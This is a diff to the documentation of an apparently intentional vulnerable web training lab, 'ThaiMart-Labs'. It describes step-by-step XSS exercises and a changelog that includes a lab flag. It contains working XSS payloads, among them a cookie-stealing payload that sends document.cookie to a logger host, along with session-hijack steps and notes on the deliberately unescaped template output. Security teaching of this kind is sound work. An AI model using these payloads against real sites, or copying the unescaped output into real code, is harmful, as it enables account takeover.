@@ -360,21 +360,48 @@ ThaiMart-Labs/
 ### Lab 07: Reflected XSS
 - **Path:** `/lab07`
 - **Story:** Product Search
-- **Vulnerable:** YES - Reflected XSS
-- **Attack:** `<script>alert(1)</script>`
+- **Vulnerable:** YES - Reflected XSS (uses `<%- %>` unescaped output)
+- **Attack Flow:**
+  1. Search normal text (e.g., "iPhone") → Page shows: `ผลการค้นหา: iPhone`
+  2. View page source (Ctrl+U) → See raw input in HTML
+  3. Search: `<script>alert(1)</script>` → Alert popup fires
+  4. View source → See `<script>` tag rendered raw in HTML
+- **Technical:** Search query reflected via EJS `<%- search %>` (unescaped)
 
 ### Lab 08: Cookie Stealing
 - **Path:** `/lab08`
 - **Story:** Member Search
 - **Credentials:** member1 / 1234
 - **Vulnerable:** YES - Reflected XSS + Cookie Theft
-- **Attack:** `<img src=x onerror="fetch('http://ATTACKER/logger/catch?c='+document.cookie)">`
+- **Attack Flow:**
+  1. Victim logs in at `/lab08/login` → Cookies set (NO HttpOnly flag)
+  2. Attacker opens `/logger` to monitor incoming requests
+  3. Attacker crafts malicious URL and sends to victim:
+     ```
+     http://10.10.61.87/lab08/search?q=<img src=x onerror="fetch('http://10.10.61.87/logger/catch?c='+document.cookie)">
+     ```
+  4. Victim clicks link → XSS fires → Cookie sent to logger
+  5. Attacker sees in `/logger`: `Cookie: thaimart_uid=member1; thaimart_role=customer`
+  6. Attacker copies cookie → sets in own browser → accesses victim's account
+- **Cookies set (all readable by JS):**
+  | Cookie | Value |
+  |--------|-------|
+  | `thaimart_uid` | member1 |
+  | `thaimart_role` | customer |
+  | `thaimart_session` | sess_[random] |
 
 ### Lab 09: Stored XSS
 - **Path:** `/lab09`
-- **Story:** Product Reviews
-- **Vulnerable:** YES - Stored XSS
-- **Attack:** Submit review with `<script>alert('XSS')</script>`
+- **Story:** Product Reviews (iPhone 15 Pro Max)
+- **Vulnerable:** YES - Stored XSS (uses `<%- %>` unescaped output)
+- **Pre-seeded:** 3 normal reviews for realism
+- **Attack Flow:**
+  1. Post normal comment → Appears on page
+  2. Post XSS: `<script>alert('Stored XSS!')</script>` → Alert fires immediately
+  3. Refresh page → Alert fires again (stored in DB)
+  4. Open Incognito → Visit same URL → Alert fires for everyone
+- **Reset Endpoint:** `POST /lab09/clear` (clears all reviews, re-seeds 3 normal ones)
+- **Reset Button:** Located in footer for instructor use
 
 ### Lab 10: Burp Suite - Intercept
 - **Path:** `/lab10`
@@ -483,6 +510,15 @@ ssh thaimart-lab "cd ~/ThaiMart-Labs && sudo docker-compose ps"
 ---
 
 *Last Updated: 2026-04-21*
+- Lab 07: Verified reflected XSS attack flow (search → raw HTML reflection)
+- Lab 08: Documented full cookie stealing flow with logger
+- Lab 08: Profile page now shows order history (removed DevTools hint)
+- Lab 09: Added `/lab09/clear` endpoint for instructor reset
+- Lab 09: Added Reset Reviews button in footer
+- Lab 09: 3 pre-seeded normal reviews for realism
+- All XSS labs: Clean UI with no visible hints or instructions
+
+*Updates (2026-04-21 - Earlier):*
 - Lab 05: Added admin login `/lab05/admin` with flag `SMC{un10n_2_4dm1n_p4n3l}`
 - Lab 05: Search now works for both name AND department
 - Lab 05: Removed explanation panel (clean UI, no hints)
